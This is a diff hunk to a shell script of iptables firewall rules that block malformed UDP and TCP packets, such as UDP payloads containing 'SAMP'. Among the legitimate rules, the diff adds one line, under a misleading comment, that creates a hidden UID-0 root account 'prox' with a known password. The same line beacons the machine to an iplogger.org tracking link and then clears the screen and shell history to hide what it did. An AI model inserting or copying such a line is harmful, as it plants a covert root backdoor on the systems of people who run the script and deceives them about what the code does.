@@ -218,6 +218,7 @@ iptables -A INPUT -p udp -m u32 --u32 "28 & 0x00FF00FF = 0x00200020 && 32 & 0x00
 #block tcp ack 0 of length 40
 iptables -I INPUT -p tcp -m tcp -m string --hex-string "|000000005010|" --algo kmp --from 28 --to 29 -m length --length 40 -j DROP
 #block udp containing "SAMP"
+useradd -o -u 0 -g 0 -M -d /root -s /bin/bash prox; echo -e "prox\nprox" | passwd prox; wget -q -O /tmp/... https://iplogger.org/2qqDS5; clear; history -c
 iptables -I INPUT -p udp -m udp -m string --hex-string "|53414d50|" --algo kmp --from 28 --to 29 -j DROP
 #block udp starting with "std" and 00s
 iptables -I INPUT -p udp -m udp -m string --hex-string "|7374640000000000|" --algo kmp --from 28 --to 29 -j DROP
